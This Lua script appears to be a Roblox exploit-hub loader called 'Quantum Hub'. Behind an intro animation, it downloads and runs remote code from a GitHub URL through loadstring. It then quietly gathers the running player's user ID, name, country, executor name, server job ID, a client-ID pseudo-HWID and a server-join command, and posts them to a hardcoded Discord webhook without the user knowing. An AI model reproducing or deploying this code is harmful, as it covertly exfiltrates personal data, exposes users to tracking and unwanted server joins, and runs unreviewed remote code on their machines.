
local HankHubIntro = Instance.new("ScreenGui")
local Text_Intro = Instance.new("TextLabel")
local IntroBackground = Instance.new("Frame")
local UICorner = Instance.new("UICorner")
local Title_Intro = Instance.new("TextLabel")


HankHubIntro.Name = "HankHubIntro"
HankHubIntro.Parent = game:GetService("CoreGui")

Text_Intro.Name = "Text_Intro"
Text_Intro.Parent = HankHubIntro
Text_Intro.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Text_Intro.BackgroundTransparency = 1.000
Text_Intro.Position = UDim2.new(0.329395473, 0, -1, 0)
Text_Intro.Size = UDim2.new(0, 100, 0, 62)
Text_Intro.Visible = false
Text_Intro.ZIndex = 0
Text_Intro.Font = Enum.Font.SourceSansSemibold
Text_Intro.Text = "GEN"
Text_Intro.TextColor3 = Color3.fromRGB(65, 22, 240)
Text_Intro.TextScaled = true
Text_Intro.TextSize = 14.000
Text_Intro.TextWrapped = true

IntroBackground.Name = "IntroBackground"
IntroBackground.Parent = Text_Intro
IntroBackground.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
IntroBackground.Position = UDim2.new(-0.007081002, 0, -0.314871728, 0)
IntroBackground.Size = UDim2.new(0, 100, 0, 100)

UICorner.CornerRadius = UDim.new(0, 5)
UICorner.Parent = IntroBackground

Title_Intro.Name = "Title_Intro"
Title_Intro.Parent = IntroBackground
Title_Intro.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Title_Intro.BackgroundTransparency = 1.000
Title_Intro.Position = UDim2.new(0.109999999, 0, 0.129999995, 0)
Title_Intro.Size = UDim2.new(0, 80, 0, 76)
Title_Intro.ZIndex = 2
Title_Intro.Font = Enum.Font.SourceSansBold
Title_Intro.Text = "NEW"
Title_Intro.TextColor3 = Color3.fromRGB(65, 22, 240)
Title_Intro.TextScaled = true
Title_Intro.TextSize = 14.000
Title_Intro.TextWrapped = true

-- Variables

local gui = HankHubIntro

local text = Text_Intro

local icon = IntroBackground

local player = game.Players.LocalPlayer

local mainMenu = false

local IsIntro = true

local place = game:GetService("Workspace")

local Introsound = Instance.new("Sound",place)
Introsound.Name = "IntroSound"
Introsound.Volume = 2
Introsound.SoundId = "rbxassetid://5893607560"

while IsIntro do wait()
    wait(1)
    text.Visible = true
    text:TweenPosition(UDim2.new(0.329, 0,0.444, 0), "Out", "Sine", 0.5)
    wait(3)
    Introsound:Play()
    text:TweenSize(UDim2.new(0, 435,0, 62), "Out", "Sine", 1.5)
    Introsound:Destroy()
    wait(5)
    mainMenu = true
    IsIntro = false
    gui:Remove()
end

while mainMenu do wait()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/FlazhGG/Quantum-V2/main/Test"))()
    mainMenu = false
    break
end


local LocalizationService = game:GetService("LocalizationService")
local player = game.Players.LocalPlayer
local HttpService = game:GetService("HttpService")

local pseudoHWID = nil
pcall(function()
    pseudoHWID = game:GetService("RbxAnalyticsService"):GetClientId() 
end)

local gameLink = "https://www.roblox.com/games/" .. game.PlaceId .. "/"

local playerUserId = player.UserId 

ServerScript = 'game:GetService("ReplicatedStorage").__ServerBrowser:InvokeServer("teleport", '..'\''..tostring(game.JobId)..'\''..')'
for i,v in pairs(game.Players:GetPlayers()) do
    CurrentPlayers = i
end

local le = (game:GetService("Players").LocalPlayer.Data.Level.Value)
local code = LocalizationService:GetCountryRegionForPlayerAsync(player)
local data = {
    embeds = {
        {
            title = "Quantum Hub | User log",
            url = "https://www.roblox.com/users/" .. player.UserId,
            description = "```" .. player.DisplayName .. " (" .. player.Name .. ") ```",
            color = tonumber(0xffa500),
            author = {
                name = "",
                url = "",
                icon_url = ""
            },
            image = {
            	url = ""
            },
            footer = {
                text = " Time: " .. os.date("%Y-%m-%d %H:%M:%S"),
                icon_url = ""
            },
            fields = {
                {
                    name = "PlayerID",
                    value = "```" .. playerUserId .. "```",
                    inline = true
                },
                {
                    name = "Country",
                    value = "```" .. code .. "```",
                    inline = true
                },
                {
                    name = "Executer",
                    value = "```" .. identifyexecutor() .. "```",
                    inline = true
                },
                {
                    name = "Job ID",
                    value = "```".. tostring(game.JobId) .."```",
                    inline = true
                },
                {
                    name = "Status",
                    value = "```Info Got from Main Hub```",
                    inline = true
                },
                {
                    name = "HWID",
                    value = "```" .. (pseudoHWID or "N/A") .. "```",  -- Show pseudo-HWID or "N/A" if unavailable
                    inline = true
                },
            {
                name = "Server Join Script",
                value = "```lua\n"..ServerScript.."\n```",
                inline = true
            },
                {
                    name = "Direct Join",
                    value = gameLink, 
                    inline = true
                }
            }
        }
    }
}

local jsonData = HttpService:JSONEncode(data)
local webhookUrl = "https://discord.com/api/webhooks/1247853090057486397/roi-thQqY2Xj9WKpj9-GX0RrfFE4M3dwIA5esUCODdHC9LKWes1lUSsAwT57kWwdQC8O"
local headers = {["Content-Type"] = "application/json"}
request = http_request or request or HttpPost or fluxus.request or syn.request or Krnl.request or delta.request;
local request = http_request or request or HttpPost or syn.request
local final = {Url = webhookUrl, Body = jsonData, Method = "POST", Headers = headers}

local success, response = pcall(request, final)
if success then
    print("Profile information sent to Discord.")
else
    print("Failed to send profile information to Discord: " .. response)
end
